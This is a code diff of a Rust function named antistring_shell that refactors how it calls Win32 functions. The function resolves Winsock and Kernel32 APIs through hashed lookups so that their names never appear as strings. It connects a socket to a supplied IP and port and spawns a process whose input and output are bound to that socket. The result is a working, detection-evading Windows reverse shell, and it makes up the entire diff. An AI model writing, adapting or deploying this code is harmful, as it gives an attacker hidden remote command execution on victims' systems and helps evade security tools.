@@ -148,23 +148,27 @@ pub fn shell(ip: &str, port: u16) {
 
 #[cfg(feature = "antistring")]
 pub fn antistring_shell(ip: &str, port: u16) {
-    // See line 16
-    let function = rco_utils::find_function_address("Ws2_32", 0xedf45b56dba24418).unwrap();
-    let function = rco_utils::test!(function; [u16, &mut WSAData]; [()]);
-    function(WSASTARTUPVAL, &mut WSAData::default());
-    /*unsafe { 
-        mem::transmute::<*const (), fn(u16, WSAData)>
-        (function)(WSASTARTUPVAL, &mut WSAData::default())
-    };*/
-
     // See line 25
-    let function = rco_utils::find_function_address("Ws2_32", 0xad51563d572a6798).unwrap();
-    let socket = unsafe { 
-        mem::transmute::<*const (), fn(i32, i32, i32, *const WSAPROTOCOL_INFOA, i32, i32) -> SOCKET>
-        (function)(AF_INET.0 as i32, SOCK_STREAM as i32, IPPROTO_TCP.0, ptr::null(), 0, 0)
-    };
+    let function = rco_utils::find_function_address("Ws2_32", 0xedf45b56dba24418).unwrap();
+    let function = rco_utils::construct_win32_function!(function; [u16, &mut WSAData]; [()]);
+    unsafe { function(
+        WSASTARTUPVAL,
+        &mut WSAData::default()
+    ) };
 
-    // See line 30
+    // See line 39
+    let function = rco_utils::find_function_address("Ws2_32", 0xad51563d572a6798).unwrap();
+    let function = rco_utils::construct_win32_function!(function; [i32, i32, i32, *const WSAPROTOCOL_INFOA, i32, i32]; [SOCKET]);
+    let socket = unsafe { function(
+        AF_INET.0 as i32,
+        SOCK_STREAM as i32,
+        IPPROTO_TCP.0,
+        ptr::null(),
+        0,
+        0
+    ) };
+
+    // See line 53
     let function = rco_utils::find_function_address("Ws2_32", 0xf6d69fad519d46a0).unwrap();
     let mut sockaddr_in = SOCKADDR_IN::default();
     sockaddr_in.sin_family = AF_INET.0 as u16;
@@ -173,42 +177,48 @@ pub fn antistring_shell(ip: &str, port: u16) {
         .unwrap()
         .into_raw() as *mut u8
     );
-    unsafe { 
-        mem::transmute::<*const (), fn(i32, PCSTR, *mut c_void) -> i32>
-        (function)(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr)
-    };
+    let function = rco_utils::construct_win32_function!(function; [i32, PCSTR, *mut c_void]; [i32]);
+    unsafe { function(
+        AF_INET.0 as i32,
+        ip_pcstr,
+        sin_addr_ptr
+    ) };
 
     // See line 46
     let function = rco_utils::find_function_address("Ws2_32", 0x57420f0d05112fd1).unwrap();
-    sockaddr_in.sin_port = unsafe { 
-        mem::transmute::<*const (), fn(u16) -> u16>
-        (function)(port)
-    };
+    let function = rco_utils::construct_win32_function!(function; [u16]; [u16]);
+    sockaddr_in.sin_port = function(
+        port
+    );
 
-    // See line 51
+    // See line 79
     let function = rco_utils::find_function_address("Ws2_32", 0xcbfa974b4e43f414).unwrap();
-    unsafe { 
-        mem::transmute::<*const (), fn(SOCKET, *const SOCKADDR, i32) -> i32>
-        (function)(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>() as _)
-    };
+    let function = rco_utils::construct_win32_function!(function; [SOCKET, *const SOCKADDR, i32]; [i32]);
+    unsafe { function(
+        socket,
+        &sockaddr_in as *const SOCKADDR,
+        mem::size_of::<SOCKADDR_IN>() as i32
+    ) };
+    
 
-    // See line 59
+    // See line 102
     let function = rco_utils::find_function_address("Kernel32", 0x9822936f60f9a914).unwrap();
     let lp_buffer: &mut [u8] = &mut [0; 50];
-    unsafe { 
-        mem::transmute::<*const (), fn(&mut [u8])>
-        (function)(lp_buffer)
-    };
+    let function = rco_utils::construct_win32_function!(function; [&mut [u8]]; [()]);
+    unsafe { function(
+        lp_buffer
+    ) };
     let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
     let system_dir = system_dir.to_str().unwrap();
 
-    // See line 67
+    // See line 114
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
     let mut startup_info = STARTUPINFOA {
         cb: mem::size_of::<STARTUPINFOA>() as u32,
         dwFlags: STARTF_USESTDHANDLES,
         ..Default::default()
     };
+
     let sock_handle = &socket as *const SOCKET as *const HANDLE;
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
@@ -217,17 +227,17 @@ pub fn antistring_shell(ip: &str, port: u16) {
         .unwrap()
         .into_raw() as *mut u8
     );
-    unsafe {
-        mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
-        (function)(PCSTR::null(),
-                   lp_command_line,
-                   &SECURITY_ATTRIBUTES::default(),
-                   &SECURITY_ATTRIBUTES::default(),
-                   true,
-                   PROCESS_CREATION_FLAGS::default(),
-                   ptr::null(),
-                   PCSTR::null(),
-                   &startup_info,
-                   &mut PROCESS_INFORMATION::default())
-    };
+    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [BOOL]);
+    unsafe { function(
+        PCSTR::null(),
+        lp_command_line,
+        &SECURITY_ATTRIBUTES::default(),
+        &SECURITY_ATTRIBUTES::default(),
+        true,
+        PROCESS_CREATION_FLAGS::default(),
+        ptr::null(),
+        PCSTR::null(),
+        &startup_info,
+        &mut PROCESS_INFORMATION::default()
+    ) };
 }
